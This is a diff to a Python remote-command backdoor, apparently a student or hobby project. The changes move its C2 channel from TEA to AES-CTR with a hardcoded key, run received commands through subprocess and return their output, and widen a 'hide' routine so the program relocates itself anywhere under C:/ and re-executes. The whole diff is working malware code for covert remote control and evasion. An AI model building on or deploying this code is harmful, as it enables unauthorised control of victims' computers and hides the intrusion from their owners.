@@ -1,4 +1,4 @@
-import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs
+import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs, pyaes
 
 
 def runServer(HOST,PORT):
@@ -17,7 +17,8 @@ def connectionLoop(conn, addr):
     PKT_SIZE = 1024
     while True:
         ##receive client data
-        recv_data = conn.recv(PKT_SIZE).decode()
+        #recv_data = conn.recv(PKT_SIZE).decode()
+        recv_data = conn.recv(PKT_SIZE)
         if not recv_data:
             # if data is not received break
             break
@@ -30,7 +31,9 @@ def connectionLoop(conn, addr):
         print("client said (dec):" + str(recv_msg))
 
         ##extract the command
-        cmd = recv_msg.strip().split(" ",1)
+        cmd = str(recv_msg)[2:-1]
+        cmd = cmd.split(" ",1)
+        #cmd = cmd[1:len(cmd)]
 
         ##handle special commands
         if (cmd[0] == "HIDE"):
@@ -57,11 +60,11 @@ def connectionLoop(conn, addr):
         packet, err = packInput(cmd_output)
         if(err != 0):
             print("Some error packing output occured")
-            print(err)
             packet = "TEMP_ERROR_PACKET" #replace this with code to re-try packing
 
         #send return packet data
-        conn.send(packet.encode())
+        conn.send(packet)
+        #conn.send(packet)
     return
 
 ######################
@@ -78,14 +81,16 @@ def tryExecute(cmd):
     cmd_output = None
     err = 0
 
+    #try the command
     try:
         rawout = subprocess.run(cmd, capture_output=True)
+        #rawout = os.popen(str(cmd)).read()
     except Exception as e:
         # error executing command
         err = 1
     else:
+        #grab the output
         cmd_output = str(rawout.stdout,'utf-8')
-        #cmd_output = "testytesttest"
     finally:
         pass
     return cmd_output, err
@@ -99,7 +104,8 @@ def tryExecute(cmd):
 #       = 3 ; decryption error
 #       = 4 ; packet crafting error
 def packInput(user_input):
-    TEA_KEY = "zMWYCRLd4szoBiPP"
+    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
+    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
     packet = None
     err = 0
 
@@ -108,11 +114,10 @@ def packInput(user_input):
     if(safe_input == None):
         err = 1
         return packet, err
-    print(safe_input)
     ##encryption
     encrypted_safe_input = ""
     try:
-        encrypted_safe_input = encrypt(safe_input, TEA_KEY)
+        encrypted_safe_input = aes.encrypt(safe_input)
     except Exception as e:
         err = 2
         return packet, err
@@ -121,7 +126,7 @@ def packInput(user_input):
     
     ##decryption test
     try:
-        decrypt(encrypted_safe_input, TEA_KEY)
+        aes.decrypt(encrypted_safe_input)#.decode('utf-8')
     except Exception as e:
         err = 2
         return packet, err
@@ -141,7 +146,8 @@ def packInput(user_input):
 #       = 1 ; unpacking error
 #       = 2 ; decryption error
 def unpackData(recv_data):
-    TEA_KEY = "zMWYCRLd4szoBiPP"
+    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
+    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
     recv_msg = None
     err = 0
 
@@ -150,7 +156,7 @@ def unpackData(recv_data):
 
     ##decrypt message
     try:
-        recv_msg = decrypt(encrypted_recv_msg, TEA_KEY)
+        recv_msg = aes.decrypt(encrypted_recv_msg)#.decode('utf-8')
     except Exception as e:
         err = 2
         return recv_msg, err
@@ -167,20 +173,11 @@ def unpackData(recv_data):
 #args: user_input - raw input captured from cli
 #returns: None if user_input is too long (>512 bytes)
 #otherwise, user_input padded to a certain length with whitespace. 
-def processInput(uinput):
-    len_input = len(uinput)
-    if(len_input <= 64):
-        return (uinput + ' ' * (64 - len(uinput)))
-    elif(len_input <= 128):
-        return (uinput + ' ' * (128 - len(uinput)))
-    elif(len_input <= 256):
-        return (uinput + ' ' * (256 - len(uinput)))
-    elif(len_input <= 512):
-        return (uinput + ' ' * (512 - len(uinput)))
-    else:
+def processInput(user_input):
+    if(len(user_input) > 960):
         #command was too large
         return None
-    return None
+    return user_input
 
 #def hide()
 #Move the file to a random location on machine and run it
@@ -189,7 +186,7 @@ def hide():
 
     directories=[]
 
-    for root, dirs, files in os.walk("C:/Users/Cameron/Desktop/CS"): #walk all directories to find random place to hide
+    for root, dirs, files in os.walk("C:/"): #walk all directories to find random place to hide
         for dir in dirs:
             directories.append(root+"/"+dir+"/") 
 
@@ -201,7 +198,6 @@ def hide():
             os.rename(source,newFile) #move current program to new location
 
         except Exception as e: #if directory is protected or private, try again
-            print(e)
             newDir=""
 
     exec(open(newFile).read())
